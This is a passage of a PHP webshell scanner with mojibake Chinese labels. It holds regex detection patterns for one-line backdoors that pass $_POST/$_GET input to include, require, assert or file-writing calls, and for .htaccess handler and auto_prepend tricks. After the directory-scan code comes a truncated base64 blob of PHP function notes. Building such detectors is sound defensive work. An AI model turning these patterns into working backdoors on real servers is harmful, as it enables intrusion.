 'һ�仰��������->require($_'=>'require\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
 'һ�仰��������->require_once($_'=>'require_once\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
 'һ�仰��������->include($_'=>'include\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
 'һ�仰��������->include_once($_'=>'include_once\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)', 
 'һ�仰��������->call_user_func("assert"'=>'call_user_func\(("|\')assert("|\')',  
 'һ�仰��������->call_user_func($_'=>'call_user_func\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
 'һ�仰��������->$_POST/GET/REQUEST/COOKIE[?]($_POST/GET/REQUEST/COOKIE[?]'=>'\$_(POST|GET|REQUEST|COOKIE)\[([^\]]+)\]\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[', 
 'һ�仰��������->echo(file_get_contents($_POST/GET/REQUEST/COOKIE'=>'echo\(file_get_contents\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',                                     
 '�ϴ���������->file_put_contents($_POST/GET/REQUEST/COOKIE,$_POST/GET/REQUEST/COOKIE'=>'file_put_contents\((\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[([^\]]+)\],(\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)',
 '�ϴ���������->fputs(fopen("?","w"),$_POST/GET/REQUEST/COOKIE['=>'fputs\(fopen\((.+),(\'|")w(\'|")\),(\'|"|\s*)\\$_(POST|GET|REQUEST|COOKIE)\[',
 '.htaccess��������->SetHandler application/x-httpd-php'=>'SetHandlerapplication\/x-httpd-php',
 '.htaccess��������->php_value auto_prepend_file'=>'php_valueauto_prepend_file',
 '.htaccess��������->php_value auto_append_file'=>'php_valueauto_append_file'
 ); 
 
}


if($btnScan==1&&$path!=""){
  $dir = isset($path)?$path:MYPATH;
  $dir = substr($dir,-1)!="/"?$dir."/":$dir;
  $setting['user']="php|php3|phtml|shtml|ini|asp";
  $setting['all']=0;
  $setting['hta']=1;
define('REALPATH', str_replace('//','/',str_replace('\\','/',substr($realpath, 0, strlen($realpath) - strlen($selfpath)))));
define('MYFILE', basename(__FILE__));
define('MYPATH', str_replace('\\', '/', dirname(__FILE__)).'/');
define('MYFULLPATH', str_replace('\\', '/', (__FILE__)));
define('HOST', "http://".$_SERVER['HTTP_HOST']);
   $start=mktime();
   $is_user = array();
   $is_ext = "";
   $list = "";
   
   if(trim($setting['user'])!="")
   {
    $is_user = explode("|",$setting['user']);
    if(count($is_user)>0)
    {
     foreach($is_user as $key=>$value)
      $is_user[$key]=trim(str_replace("?","(.)",$value));
     $is_ext = "(\.".implode("($|\.))|(\.",$is_user)."($|\.))";
    }
   }
   if($setting['hta']==1)
   {
    $is_hta=1;
    $is_ext = strlen($is_ext)>0?$is_ext."|":$is_ext;
    $is_ext.="(^\.htaccess$)";
   }
   if($setting['all']==1 || (strlen($is_ext)==0 && $setting['hta']==0))
   {
    $is_ext="(.+)";
   }


   $php_code = getCode();
   if(!is_readable($dir))
    $dir = MYPATH;
   $count=$scanned=0;
   scan($dir,$is_ext);
   $end=mktime();
   $spent = ($end - $start);
?>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="15" height="30"></td>
    <td width="48%">�ļ�</td>
    <td width="12%">����ʱ��</td>
    <td width="10%">ԭ��</td>
    <td width="20%">����</td>
    <td>����</td>
  </tr>
<?php echo $list?>
</table>
<br>
<hr>
<div>ɨ��: <?php echo $scanned?> �ļ� | ����: <?php echo $count?> �����ļ� | ��ʱ: <?php echo $spent?> ��</div>

<?
 die();
}


//������ѯ---------------------------------------------------------------------
if($hscx!=""){
$N= strtolower(iconv('utf-8', 'gb2312', js_unescape($n)));
if($hscx==1){
$hs="IHBocGluZm8oKSCy6b+0t/7O8cb3xeTWwyB8cHJvY19vcGVuKCkgtPK/qtK7uPbWuM/yvfizzLXEudy1wHxzaGVsbF9leGVjKCkg1rTQ0M+1zbPN4rK/w/zB7izD/MHu0NDKtbzKyc+99srHt7TGsrrFIChgKSCy2df3t/u1xLHkzOV8cGFzc3RocnUoKSDWu7X308PD/MHuo6yw0cP8we61xNTL0NC94bn71K3R+bXY1rG908rks/a1vbHq17zK5LP2yeixuMnPoaMgfGV4ZWMoKda00NDPtc2zzeKyv8P8we6yu8rks/a94bn7o6y3tbvY1+6689K70NBzaGVsbL3hufujrMv509C94bn7v8nS1LGjtOa1vdK7uPa3tbvYtcTK/dfpwO/D5qGjIHxzeXN0ZW0oKSDWtNDQz7XNs83isr/D/MHus8m5psrks/ayore1u9jX7rrz0rvQ0HNoZWxsveG5+yB8aXNzZXQoKSC87LLiseTBv8rHt/HJ6NbDIHxwcmVnX21hdGNoKCkg1rTQ0NK7uPbV/dTyse2078q9xqXF5CB8dW5zZXQoKSDXos/6tqjS5bXEseTBvyB8aWNvbnYoKSDOxLG+seDC69equ7sgfG9iX3N0YXJ0KCkgtPK/qsrks/a/2NbGu7qz5XxzZXNzaW9uX3N0YXJ0KCkgv6rG9CBzZXNzaW9ufGJhc2U2NF9kZWNvZGUoKSBiYXNlNjQgttTK/b7dvfjQ0L3iwut8YmFzZTY0X2VuY29kZSgpIGJhc2U2NCC21Mr9vt29+NDQseDC63xhcnJheSgptLS9qMr91+mho3BocDN8YXJyYXlfY2hhbmdlX2tleV9jYXNlKCm3tbvYxuS8/L75zqq089C0u/LQodC0tcTK/dfpoaNwaHA0fGFycmF5X2NodW5rKCmw0dK7uPbK/dfpt9a47s6q0MK1xMr91+m/6aGjcGhwNHxhcnJheV9jb21iaW5lKCnNqLn9us+yosG9uPbK/dfpwLS0tL2o0ru49tDCyv3X6aGjcGhwNXxhcnJheV9jb3VudF92YWx1ZXMoKdPD09rNs7zGyv3X6dbQy/nT0Na1s/bP1rXEtM7K/aGjcGhwNHxhcnJheV9kaWZmKCm3tbvYwb249sr91+m1xLLuvK/K/dfpoaNwaHA0fGFycmF5X2RpZmZfYXNzb2MoKbHIvc+8/MP7us28/Na1o6yyore1u9jBvbj2yv3X6bXEsu68r8r91+mho3BocDR8YXJyYXlfZGlmZl9rZXkoKbHIvc+8/MP7o6yyore1u9jBvbj2yv3X6bXEsu68r8r91+mho3BocDV8YXJyYXlfZGlmZl91YXNzb2MoKc2ouf3Tw7unzOG5qbXEu9i197qvyv3X9sv30v287LLpwLS8xsvjyv3X6bXEsu68r6GjcGhwNXxhcnJheV9kaWZmX3VrZXkoKdPDu9i197qvyv221Lz8w/uxyL3PvMbL48r91+m1xLLuvK+ho3BocDV8YXJyYXlfZmlsbCgp08O4+LaotcTWtczus+TK/dfpoaNwaHA0fGFycmF5X2ZpbHRlcigp08O72LX3uq/K/bn9wsvK/dfp1tC1xNSqy9iho3BocDR8YXJyYXlfZmxpcCgpvbu7u8r91+nW0LXEvPy6zda1oaNwaHA0fGFycmF5X2ludGVyc2VjdCgpvMbL48r91+m1xL27vK+ho3BocDR8YXJyYXlfaW50ZXJzZWN0X2Fzc29jKCmxyL3PvPzD+7rNvPzWtaOssqK3tbvYwb249sr91+m1xL27vK/K/dfpoaNwaHA0fGFycmF5X2ludGVyc2VjdF9rZXkoKcq508O8/MP7sci9z7zGy+PK/dfptcS9u7yvoaNwaHA1fGFycmF5X2ludGVyc2VjdF91YXNzb2MoKbT4y/fS/bzssum8xsvjyv3X6bXEvbu8r6Os08O72LX3uq/K/bHIvc/L99L9oaNwaHA1fGFycmF5X2ludGVyc2VjdF91a2V5KCnTw7vYtfe6r8r9sci9z7z8w/vAtLzGy+PK/dfptcS9u7yvoaNwaHA1fGFycmF5X2tleV9leGlzdHMoKbzssum4+LaotcS8/MP7u/LL99L9yse38bTm1NrT2sr91+nW0KGjcGhwNHxhcnJheV9rZXlzKCm3tbvYyv3X6dbQy/nT0LXEvPzD+6GjcGhwNHxhcnJheV9tYXAoKb2ru9i197qvyv3X99PDtb24+Laoyv3X6bXEtaXUqsnPoaNwaHA0fGFycmF5X21lcmdlKCmw0dK7uPa78rbguPbK/dfpus+yos6q0ru49sr91+mho3BocDR8YXJyYXlfbWVyZ2VfcmVjdXJzaXZlKCm13bnptdi6z7Ki0ru49rvytuC49sr91+mho3BocDR8YXJyYXlfbXVsdGlzb3J0KCm21LbguPbK/dfpu/K24M6syv3X6b340NDFxdDyoaNwaHA0fGFycmF5X3BhZCgp08PWtb2ryv3X6czusrm1vda4tqizpLbIoaNwaHA0fGFycmF5X3BvcCgpvavK/dfp1+6689K7uPa1pdSqta+z9qOos/bVu6OpoaNwaHA0fGFycmF5X3Byb2R1Y3QoKbzGy+PK/dfp1tDL+dPQ1rW1xLPLu/2ho3BocDV8YXJyYXlfcHVzaCgpvavSu7j2u/K24Lj2taXUqqOo1KrL2KOp0bnI68r91+m1xMSpzrKjqMjr1bujqaGjcGhwNHxhcnJheV9yYW5kKCm008r91+nW0Mvmu/rRobP20ru49rvytuC49tSqy9ijrLKit7W72KGjcGhwNHxhcnJheV9yZWR1Y2UoKdPDu9i197qvyv21/LT6tdi9q8r91+m88ruvzqq1pdK7tcTWtaGjcGhwNHxhcnJheV9yZXZlcnNlKCm9q9Styv3X6dbQtcTUqsvYy7PQ8ret16qjrLS0vajQwrXEyv3X6bKit7W72KGjcGhwNHxhcnJheV9zZWFyY2goKdTayv3X6dbQy9HL97j4tqi1xNa1o6zI57n7s8m5ptTyt7W72M/g06a1xLz8w/uho3BocDR8YXJyYXlfc2hpZnQoKcm+s/3K/dfp1tC1xLXa0ru49tSqy9ijrLKit7W72LG7yb6z/dSqy9i1xNa1oaNwaHA0fGFycmF5X3NsaWNlKCnU2sr91+nW0Lj5vt3M9bz+yKGz9tK7ts7WtaOssqK3tbvYoaNwaHA0fGFycmF5X3NwbGljZSgpsNHK/dfp1tC1xNK7sr+31siltfSyotPDxuTL/Na1yKG0+qGjcGhwNHxhcnJheV9zdW0oKbzGy+PK/dfp1tDL+dPQ1rW1xLrNoaNwaHA0fGFycmF5X3VkaWZmKCnTw7vYtfe6r8r9sci9z8r9vt3AtLzGy+PK/dfptcSy7ryvoaNwaHA1fGFycmF5X3VkaWZmX2Fzc29jKCm0+Mv30v287LLpvMbL48r91+m1xLLuvK+jrNPDu9i197qvyv2xyL3Pyv2+3aGjcGhwNXxhcnJheV91ZGlmZl91YXNzb2MoKbT4y/fS/bzssum8xsvjyv3X6bXEsu68r6Os08O72LX3uq/K/bHIvc/K/b7dus3L99L9oaNwaHA1fGFycmF5X3VpbnRlcnNlY3QoKbzGy+PK/dfptcS9u7yvo6zTw7vYtfe6r8r9sci9z8r9vt2ho3BocDV8YXJyYXlfdWludGVyc2VjdF9hc3NvYygptPjL99L9vOyy6bzGy+PK/dfptcS9u7yvo6zTw7vYtfe6r8r9sci9z8r9vt2ho3BocDV8YXJyYXlfdWludGVyc2VjdF91YXNzb2MoKbT4y/fS/bzssum8xsvjyv3X6bXEvbu8r6Os08O72LX3uq/K/bHIvc/K/b7dus3L99L9oaNwaHA1fGFycmF5X3VuaXF1ZSgpyb6z/cr91+nW0NbYuLS1xNa1oaNwaHA0fGFycmF5X3Vuc2hpZnQoKdTayv3X6b+qzbey5cjr0ru49rvytuC49tSqy9iho3BocDR8YXJyYXlfdmFsdWVzKCm3tbvYyv3X6dbQy/nT0LXE1rWho3BocDR8YXJyYXlfd2FsaygpttTK/dfp1tC1xMO/uPazydSx06bTw9PDu6e6r8r9oaNwaHAzfGFycmF5X3dhbGtfcmVjdXJzaXZlKCm21Mr91+nW0LXEw7+49rPJ1LG13bnptdjTptPD08O7p7qvyv2ho3BocDV8YXJzb3J0KCm21Mr91+m9+NDQxObP8sXF0PKyorGjs9bL99L9udjPtaGjcGhwM3xhc29ydCgpttTK/dfpvfjQ0MXF0PKyorGjs9bL99L9udjPtaGjcGhwM3xjb21wYWN0KCm9qMGi0ru49sr91+mjrLD8wKix5MG/w/u6zcv8w8e1xNa1oaNwaHA0fGNvdW50KCm8xsvjyv3X6dbQtcTUqsvYyv3Ev7vyttTP89bQtcTK9NDUuPbK/aGjcGhwM3xjdXJyZW50KCm3tbvYyv3X6dbQtcS1scew1KrL2KGjcGhwM3xlYWNoKCm3tbvYyv3X6dbQtbHHsLXEvPyjr9a1ttSyor2ryv3X6da41evP8sew0sa2r9K7sr2ho3BocDN8ZW5kKCm9q8r91+m1xMTasr/WuNXr1rjP8tfuuvPSu7j21KrL2KGjcGhwM3xleHRyYWN0KCm008r91+nW0L2rseTBv7W8yOu1vbWxx7C1xLf7usWx7aGjcGhwM3xpbl9hcnJheSgpvOyy6cr91+nW0MrHt/G05tTa1ri2qLXE1rWho3BocDR8a2V5KCm007nYwarK/dfp1tDIobXDvPzD+6GjcGhwM3xrcnNvcnQoKbbUyv3X6bC01dW8/MP7xObP8sXF0PKho3BocDN8a3NvcnQoKbbUyv3X6bC01dW8/MP7xcXQ8qGjcGhwM3xsaXN0KCmw0cr91+nW0LXE1rW4s7j40rvQqbHkwb+ho3BocDN8bmF0Y2FzZXNvcnQoKdPDobDX1Mi7xcXQ8qGxy+O3qLbUyv3X6b340NCyu8f4t9a089Ch0LTX1sS4tcTFxdDyoaNwaHA0fG5hdHNvcnQoKdPDobDX1Mi7xcXQ8qGxy+O3qLbUyv3X6cXF0PKho3BocDR8bmV4dCgpvavK/dfp1tC1xMTasr/WuNXrz/LHsNLGtq/Su867oaNwaHAzfHBvcygpY3VycmVudCgpILXEsfDD+6GjcGhwM3xwcmV2KCm9q8r91+m1xMTasr/WuNXrtbm72NK7zruho3BocDN8cmFuZ2UoKb2owaLSu7j2sPy6rNa4tqi3ts6ntcTUqsvYtcTK/dfpoaNwaHAzfHJlc2V0KCm9q8r91+m1xMTasr/WuNXr1rjP8rXa0ru49tSqy9iho3BocDN8cnNvcnQoKbbUyv3X6cTmz/LFxdDyoaNwaHAzfHNodWZmbGUoKbDRyv3X6dbQtcTUqsvYsLTL5rv6y7PQ8tbY0MLFxcHQoaNwaHAzfHNpemVvZigpY291bnQoKSC1xLHww/uho3BocDN8c29ydCgpttTK/dfpxcXQ8qGjcGhwM3x1YXNvcnQoKcq508PTw7un19S2qNLltcSxyL3Puq/K/bbUyv3X6dbQtcTWtb340NDFxdDysqKxo7PWy/fS/bnYwaqho3BocDN8dWtzb3J0KCnKudPD08O7p9fUtqjS5bXEsci9z7qvyv221Mr91+nW0LXEvPzD+7340NDFxdDyoaNwaHAzfHVzb3J0KCnKudPD08O7p9fUtqjS5bXEsci9z7qvyv221Mr91+nW0LXE1rW9+NDQxcXQ8qGjcGhwM3xjYWxfZGF5c19pbl9tb250aCgp1eu21Na4tqi1xMTqt926zcjVwPqjrLe1u9jSu7j21MLW0LXEzOzK/aGjcGhwNHxjYWxfZnJvbV9qZCgpsNHI5cLUyNW8xsr916q7u86q1ri2qMjVwPq1xMjVxtqho3BocDR8Y2FsX2luZm8oKbe1u9jT0LnYuPi2qMjVwPq1xNDFz6Kho3BocDR8Y2FsX3RvX2pkKCmw0cjVxtrXqru7zqrI5cLUyNW8xsr9oaNwaHA0fGVhc3Rlcl9kYXRlKCm3tbvY1ri2qMTqt921xLi0u+692s7n0rm1xCBVbml4IMqxvOS0waGjcGhwM3xlYXN0ZXJfZGF5cygpt7W72Na4tqjE6rfdtcS4tLvuvdrT63BocDMg1MIgMjEgyNXWrrzktcTM7Mr9oaNwaHAzfEZyZW5jaFRvSkQoKb2rt6i5+rmyus3A+reo16q7u7PJzqrI5cLUyNW8xsr9oaNwaHAzfEdyZWdvcmlhblRvSkQoKb2ruPHA+7jfwO/A+reo16q7u7PJzqrI5cLUyNW8xsr9oaNwaHAzfEpERGF5T2ZXZWVrKCm3tbvYyNXG2tTa1ty8uKGjcGhwM3xKRE1vbnRoTmFtZSgpt7W72NTCtcTD+7PGoaNwaHAzfEpEVG9GcmVuY2goKbDRyOXC1MjVvMbK/dequ7vOqreoufq5srrNufrA+reooaNwaHAzfEpEVG9HcmVnb3JpYW4oKbDRyOXC1MjVvMbK/dequ7vOqrjxwPu438DvwPq3qKGjcGhwM3xqZHRvamV3aXNoKCmw0cjlwtTI1bzGyv3Xqru7zqrTzMyrwPq3qKGjcGhwM3xKRFRvSnVsaWFuKCmw0cjlwtTI1bzGyv3Xqru7zqrI5cLUwPqho3BocDN8amR0b3VuaXgoKbDRyOXC1MjVvMbK/dequ7vOqiBVbml4IMqxvOS0waGjcGhwNHxKZXdpc2hUb0pEKCmw0dPMzKvA+reo16q7u86qyOXC1MjVvMbK/aGjcGhwM3xKdWxpYW5Ub0pEKCmw0cjlwtTA+tequ7vOqsjlwtTI1bzGyv2ho3BocDN8dW5peHRvamQoKbDRIFVuaXggyrG85LTB16q7u86qyOXC1MjVvMbK/aGjfGNoZWNrZGF0ZSgp0enWpLjxwPu438DvyNXG2qGjcGhwM3xkYXRlX2RlZmF1bHRfdGltZXpvbmVfZ2V0KCm3tbvYxKzIz8qxx/iho3BocDV8ZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgpyejWw8SsyM/Kscf4oaNwaHA1fGRhdGVfc3VucmlzZSgpt7W72Lj4tqi1xMjVxtrT67XYteO1xMjVs/bKsbzkoaNwaHA1fGRhdGVfc3Vuc2V0KCm3tbvYuPi2qLXEyNXG2tPrtdi147XEyNXC5MqxvOSho3BocDV8ZGF0ZSgpuPHKvbuvsb612MqxvOSjr8jVxtqho3BocDN8Z2V0ZGF0ZSgpt7W72MjVxtqjr8qxvOTQxc+ioaNwaHAzfGdldHRpbWVvZmRheSgpt7W72LWxx7DKsbzk0MXPoqGjcGhwM3xnbWRhdGUoKbjxyr27ryBHTVQvVVRDIMjVxtovyrG85KGjcGhwM3xnbW1rdGltZSgpyKG1wyBHTVQgyNXG2rXEIFVOSVggyrG85LTBoaNwaHAzfGdtc3RyZnRpbWUoKbj5vt2xvrXYx/jT8sno1sO48cq9u68gR01UL1VUQyDKsbzko6/I1cbaoaNwaHAzfGlkYXRlKCm9q7G+tdjKsbzkL8jVxtq48cq9u6/OqtX7yv1waHA1fGxvY2FsdGltZSgpt7W72LG+tdjKsbzkoaNwaHA0fG1pY3JvdGltZSgpt7W72LWxx7DKsbzktcTOosPryv2ho3BocDN8bWt0aW1lKCm3tbvY0ru49sjVxtq1xCBVbml4IMqxvOS0waGjcGhwM3xzdHJmdGltZSgpuPm+3cf40/LJ6NbDuPHKvbuvsb612MqxvOSjr8jVxtqho3BocDN8c3RycHRpbWUoKb3izvbTySBzdHJmdGltZSDJ+rPJtcTI1cbao6/KsbzkoaNwaHA1fHN0cnRvdGltZSgpvavIzrrO06LOxM7Esb61xMjVxtq78sqxvOTD6Mr2veLO9s6qIFVuaXggyrG85LTBoaNwaHAzfHRpbWUoKbe1u9i1scewyrG85LXEIFVuaXggyrG85LTBoaNwaHAzfGNoZGlyKCm4xLHktbHHsLXExL/CvKGjcGhwM3xjaHJvb3QoKbjEseS1scewvfizzLXEuPnEv8K8oaNwaHA0fGRpcigptPK/qtK7uPbEv8K8vuSx+qOssqK3tbvY0ru49rbUz/Oho3BocDN8Y2xvc2VkaXIoKbnYsdXEv8K8vuSx+qGjcGhwM3xnZXRjd2QoKbe1u9i1scewxL/CvKGjcGhwNHxvcGVuZGlyKCm08r+qxL/CvL7ksfqho3BocDN8cmVhZGRpcigpt7W72MS/wry+5LH61tC1xMz1xL+ho3BocDN8cmV3aW5kZGlyKCnW2NbDxL/CvL7ksfqho3BocDN8c2NhbmRpcigpwdCz9ta4tqjCt7621tC1xM7EvP66zcS/wryho3BocDV8ZGVidWdfYmFja3RyYWNlKCnJ+rPJIGJhY2t0cmFjZaGjcGhwNHxkZWJ1Z19wcmludF9iYWNrdHJhY2UoKcrks/YgYmFja3RyYWNloaNwaHA1fGVycm9yX2dldF9sYXN0KCm78bXD1+6687eiyfq1xLTtzvOho3BocDV8ZXJyb3JfbG9nKCnP8rf+zvHG97TtzvO8x8K8oaLOxLz+u/LUtrPMxL+x6reiy83Su7j2tO3O86GjcGhwNHxlcnJvcl9yZXBvcnRpbmcoKbnmtqixqLjmxMS49rTtzvOho3BocDR8cmVzdG9yZV9lcnJvcl9oYW5kbGVyKCm71ri01q7HsLXEtO3O87SmwO2zzNDyoaNwaHA0fHJlc3RvcmVfZXhjZXB0aW9uX2hhbmRsZXIoKbvWuLTWrsewtcTS7LOjtKbA7bPM0PKho3BocDV8c2V0X2Vycm9yX2hhbmRsZXIoKcno1sPTw7un19S2qNLltcS07c7ztKbA7bqvyv2ho3BocDR8c2V0X2V4Y2VwdGlvbl9oYW5kbGVyKCnJ6NbD08O7p9fUtqjS5bXE0uyzo7SmwO26r8r9oaNwaHA1fHRyaWdnZXJfZXJyb3IoKbS0vajTw7un19S2qNLltcS07c7zz/vPoqGjcGhwNHx1c2VyX2Vycm9yKCl0cmlnZ2VyX2Vycm9yKCkgtcSx8MP7oaNwaHA0fGJhc2VuYW1lKCm3tbvYwre+ttbQtcTOxLz+w/uyv7fWoaNwaHAzfGNoZ3JwKCm4xLHkzsS8/tfpoaNwaHAzfGNobW9kKCm4xLHkzsS8/sSjyr2ho3BocDN8Y2hvd24oKbjEseTOxLz+y/nT0NXfoaNwaHAzfGNsZWFyc3RhdGNhY2hlKCnH5bP9zsS8/te0zKy7urTmoaNwaHAzfGNvcHkoKbi01sbOxLz+oaNwaHAzfGRlbGV0ZSgpss68+yB1bmxpbmsoKSC78iB1bnNldCgpoaMgfGRpcm5hbWUoKbe1u9jCt7621tC1xMS/wrzD+7PGsr+31qGjcGhwM3xkaXNrX2ZyZWVfc3BhY2UoKbe1u9jEv8K8tcS/ydPDv9W85KGjcGhwNHxkaXNrX3RvdGFsX3NwYWNlKCm3tbvY0ru49sS/wry1xLTFxczX3Mjdwb+ho3BocDR8ZGlza2ZyZWVzcGFjZSgpZGlza19mcmVlX3NwYWNlKCkgtcSx8MP7oaNwaHAzfGZjbG9zZSgpudix1bTyv6q1xM7EvP6ho3BocDN8ZmVvZigpsuLK1M7EvP7WuNXryse38bW9wcvOxLz+veHK+LXEzrvWw6GjcGhwM3xmZmx1c2goKc/ytPK/qrXEzsS8/srks/a7urPlxNrI3aGjcGhwNHxmZ2V0YygptNO08r+qtcTOxLz+1tC3tbvY19a3+6GjcGhwM3xmZ2V0Y3N2KCm007Tyv6q1xM7EvP7W0L3izvbSu9DQo6zQo9HpIENTViDX1rbOoaNwaHAzfGZnZXRzKCm007Tyv6q1xM7EvP7W0Le1u9jSu9DQoaNwaHAzfGZnZXRzcygptNO08r+qtcTOxLz+1tC2wcih0rvQ0LKiuf3Cy7X0IEhUTUwgus0gUEhQILHqvMeho3BocDN8ZmlsZSgpsNHOxLz+tsHI69K7uPbK/dfp1tCho3BocDN8ZmlsZV9leGlzdHMoKbzssunOxLz+u/LEv8K8yse38bTm1Nqho3BocDN8ZmlsZV9nZXRfY29udGVudHMoKb2rzsS8/rbByOvX1rf7tK6ho3BocDR8ZmlsZV9wdXRfY29udGVudHO9q9fWt/u0rtC0yOvOxLz+oaNwaHA1fGZpbGVhdGltZSgpt7W72M7EvP61xMnPtM63w87KyrG85KGjcGhwM3xmaWxlY3RpbWUoKbe1u9jOxLz+tcTJz7TOuMSx5MqxvOSho3BocDN8ZmlsZWdyb3VwKCm3tbvYzsS8/rXE1+kgSUSho3BocDN8ZmlsZWlub2RlKCm3tbvYzsS8/rXEIGlub2RlILHgusWho3BocDN8ZmlsZW10aW1lKCm3tbvYzsS8/rXEyc+0ztDeuMTKsbzkoaNwaHAzfGZpbGVvd25lcigpzsS8/rXEIHVzZXIgSUQgo6jL+dPQ1d+jqaGjcGhwM3xmaWxlcGVybXMoKbe1u9jOxLz+tcTIqM/eoaNwaHAzfGZpbGVzaXplKCm3tbvYzsS8/rTz0KGho3BocDN8ZmlsZXR5cGUoKbe1u9jOxLz+wODQzaGjcGhwM3xmbG9jaygpy/i2qLvyys23xc7EvP6ho3BocDN8Zm5tYXRjaCgpuPm+3da4tqi1xMSjyr3AtMalxeTOxLz+w/u78tfWt/u0rqGjcGhwNHxmb3BlbigptPK/qtK7uPbOxLz+u/IgVVJMoaNwaHAzfGZwYXNzdGhydSgptNO08r+qtcTOxLz+1tC2wcr9vt2jrNaxtb0gRU9Go6yyos/yyuSz9ru6s+XQtL3hufuho3BocDN8ZnB1dGNzdigpvavQ0Ljxyr27r86qIENTViCyotC0yOvSu7j2tPK/qrXEzsS8/tbQoaNwaHA1fGZwdXRzKClmd3JpdGUoKSC1xLHww/uho3BocDN8ZnJlYWQoKbbByKG08r+qtcTOxLz+oaNwaHAzfGZzY2FuZigpuPm+3da4tqi1xLjxyr221MrkyOu9+NDQveLO9qGjcGhwNHxmc2Vlaygp1Nq08r+qtcTOxLz+1tC2qM67oaNwaHAzfGZzdGF0KCm3tbvYudjT2tK7uPa08r+qtcTOxLz+tcTQxc+ioaNwaHA0fGZ0ZWxsKCm3tbvYzsS8/ta41eu1xLbBL9C0zrvWw3BocDN8ZnRydW5jYXRlKCm9q87EvP692LbPtb3WuLaotcSzpLbIoaNwaHA0fGZ3cml0ZSgp0LTI687EvP6ho3BocDN8Z2xvYigpt7W72NK7uPaw/LqsxqXF5Na4tqjEo8q9tcTOxLz+w/svxL/CvLXEyv3X6aGjcGhwNHxpc19kaXIoKcXQts/WuLaotcTOxLz+w/vKx7fxysfSu7j2xL/CvKGjcGhwM3xpc19leGVjdXRhYmxlKCnF0LbPzsS8/srHt/G/yda00NCho3BocDN8aXNfZmlsZSgpxdC2z9a4tqjOxLz+yse38c6qs6O55rXEzsS8/qGjcGhwM3xpc19saW5rKCnF0LbP1ri2qLXEzsS8/srHt/HKx8GsvdOho3BocDN8aXNfcmVhZGFibGUoKcXQts/OxLz+yse38b/JtsGho3BocDN8aXNfdXBsb2FkZWRfZmlsZSgpxdC2z87EvP7Kx7fxysfNqLn9IEhUVFAgUE9TVCDJz7SrtcSho3BocDN8aXNfd3JpdGFibGUoKcXQts/OxLz+yse38b/J0LSho3BocDR8aXNfd3JpdGVhYmxlKClpc193cml0YWJsZSgpILXEsfDD+6GjcGhwM3xsaW5rKCm0tL2o0ru49tOyway906GjcGhwM3xsaW5raW5mbygpt7W72NPQudjSu7j207LBrL3TtcTQxc+ioaNwaHAzfGxzdGF0KCm3tbvYudjT2s7EvP678rf7usXBrL3TtcTQxc+ioaNwaHAzfG1rZGlyKCm0tL2oxL/CvKGjcGhwM3xtb3ZlX3VwbG9hZGVkX2ZpbGUoKb2ryc+0q7XEzsS8/tLGtq+1vdDCzrvWw6GjcGhwNHxwYXJzZV9pbmlfZmlsZSgpveLO9tK7uPbF5NbDzsS8/qGjcGhwNHxwYXRoaW5mbygpt7W72LnY09rOxLz+wre+trXE0MXPoqGjcGhwNHxwY2xvc2UoKbnYsdXT0CBwb3BlbigpILTyv6q1xL34s8yho3BocDN8cG9wZW4oKbTyv6rSu7j2vfizzKGjcGhwM3xyZWFkZmlsZSgptsHIodK7uPbOxLz+o6yyosrks/a1vcrks/a7urPloaNwaHAzfHJlYWRsaW5rKCm3tbvYt/u6xcGsvdO1xMS/seqho3BocDN8cmVhbHBhdGgoKbe1u9i++LbUwre+tsP7oaNwaHA0fHJlbmFtZSgp1tjD+8P7zsS8/rvyxL/CvKGjcGhwM3xyZXdpbmQoKbW5u9jOxLz+1rjV67XEzrvWw6GjcGhwM3xybWRpcigpyb6z/b/VtcTEv8K8oaNwaHAzfHNldF9maWxlX2J1ZmZlcigpyejWw9LRtPK/qs7EvP61xLu6s+W089ChoaNwaHAzfHN0YXQoKbe1u9i52NPazsS8/rXE0MXPoqGjcGhwM3xzeW1saW5rKCm0tL2ot/u6xcGsvdOho3BocDN8dGVtcG5hbSgptLS9qM6o0ru1xMHZyrHOxLz+oaNwaHAzfHRtcGZpbGUoKb2owaLB2cqxzsS8/qGjcGhwM3x0b3VjaCgpyejWw87EvP61xLfDzsq6zdDeuMTKsbzkoaNwaHAzfHVtYXNrKCm4xLHkzsS8/rXEzsS8/sioz96ho3BocDN8dW5saW5rKCnJvrP9zsS8/qGjcGhwM3xmaWx0ZXJfaGFzX3ZhcigpvOyy6crHt/G05tTa1ri2qMrkyOvA4NDNtcSx5MG/oaNwaHA1fGZpbHRlcl9pZCgpt7W72Na4tqi5/cLLxve1xCBJRCC6xaGjcGhwNXxmaWx0ZXJfaW5wdXQoKbTTvcWxvs3isr+78cihyuTI66OssqK9+NDQuf3Cy6GjcGhwNXxmaWx0ZXJfaW5wdXRfYXJyYXkoKbTTvcWxvs3isr+78cihtuDP7srkyOujrLKivfjQ0Ln9wsuho3BocDV8ZmlsdGVyX2xpc3QoKbe1u9iw/Lqsy/nT0LXDtb3Wp7PWtcS5/cLLxve1xNK7uPbK/dfpoaNwaHA1fGZpbHRlcl92YXJfYXJyYXkoKbvxyKG24M/useTBv6OssqK9+NDQuf3Cy6GjcGhwNXxmaWx0ZXJfdmFyKCm78cih0ru49rHkwb+jrLKivfjQ0Ln9wsuho3BocDV8ZnRwX2FsbG9jKCnOqtKqyc+0q7W9IEZUUCC3/s7xxve1xM7EvP631sXkv9W85KGjcGhwNXxmdHBfY2R1cCgpsNG1scewxL/CvLjEseTOqiBGVFAgt/7O8cb3yc+1xLi4xL/CvKGjcGhwM3xmdHBfY2hkaXIoKbjEseQgRlRQILf+zvHG98nPtcS1scewxL/CvKGjcGhwM3xmdHBfY2htb2QoKc2ouf0gRlRQIMno1sPOxLz+yc+1xMioz96ho3BocDV8ZnRwX2Nsb3NlKCm52LHVIEZUUCDBrL3ToaNwaHA0fGZ0cF9jb25uZWN0KCm08r+qIEZUUCDBrL3ToaNwaHAzfGZ0cF9kZWxldGUoKcm+s/0gRlRQILf+zvHG98nPtcTOxLz+oaNwaHAzfGZ0cF9leGV